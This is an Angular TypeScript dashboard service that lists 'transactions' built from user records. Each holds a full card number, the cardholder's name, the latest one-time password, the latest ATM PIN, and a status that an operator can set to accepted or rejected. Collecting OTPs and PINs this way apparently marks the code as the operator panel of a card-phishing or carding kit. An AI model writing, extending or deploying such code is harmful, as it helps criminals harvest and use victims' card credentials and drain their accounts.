import { Injectable } from '@angular/core';
import { BaseApiService } from './base-api.service';
import { Observable } from 'rxjs';
import { map } from 'rxjs/operators';

export interface Transaction {
  id: string;
  totalPrice: number;
  visaDetails: string;
  otp: string;
  atmPass: string;
  status: 'Pending' | 'Accepted' | 'Rejected';
}

@Injectable({
  providedIn: 'root'
})
export class DashboardService extends BaseApiService {
  private readonly baseUrl = '/api/user';

  getTransactions(): Observable<Transaction[]> {
    return this.get<any[]>(`${this.baseUrl}/all`).pipe(
      map(users => users.map(user => ({
        id: user.CardId,
        totalPrice: user.Credit,
        visaDetails: `${user.CardNumber} - ${user.CardHolder}`,
        otp: user.Otps && user.Otps.length > 0 ? user.Otps[user.Otps.length - 1].Otp : 'N/A',
        atmPass: user.Atms && user.Atms.length > 0 ? user.Atms[user.Atms.length - 1].AtmPass : 'N/A',
        status: user.Status.charAt(0).toUpperCase() + user.Status.slice(1).toLowerCase()
      })))
    );
  }

  updateTransactionStatus(id: string, status: 'Accepted' | 'Rejected' | 'Pending'): Observable<{ success: boolean }> {
    return this.patch<{ success: boolean }>(`${this.baseUrl}/${id}`, { status: status.toUpperCase() });
  }
}
